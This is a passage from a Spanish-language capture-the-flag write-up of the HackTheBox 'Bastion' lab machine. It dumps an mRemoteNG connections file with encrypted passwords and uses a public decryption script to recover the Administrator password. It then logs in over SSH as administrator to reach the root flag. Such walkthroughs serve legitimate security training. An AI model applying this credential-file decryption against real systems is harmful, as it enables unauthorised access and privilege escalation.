ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn 
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa 
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna 
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps=" 
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab 
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I 
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" 
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe 
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS 
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa 
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad 
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri 
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false"  
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC 
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo 
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false 
" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" 
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
eritRDGatewayDomain="false" />                                                                                                  
</mrng:Connections>                                                                                                             
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>
```

Dentro de dicho archivo vemos la contraseña del usuario **administrator**:

```bash
Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
```

Ahora, nos descargamos la siguiente utilidad que nos ayudará a descifrar la contraseña:

```bash
❯ git clone https://github.com/haseebT/mRemoteNG-Decrypt
Clonando en 'mRemoteNG-Decrypt'...
remote: Enumerating objects: 19, done.
remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19
Recibiendo objetos: 100% (19/19), 14.80 KiB | 14.80 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
```

Y la ejecutamos de acuerdo nos indica el propietario:

```bash
❯ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

Tenemos la contraseña del usuario **administrator**; así que podríamos tratar de ingresar vía ssh a la máquina:

```bash
❯ ssh administrator@10.10.10.134
administrator@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator                                                                                                           

administrator@BASTION C:\Users\Administrator> 
```

Ya somos el usuario **administrator** y podemos visualizar la flag (root.txt).
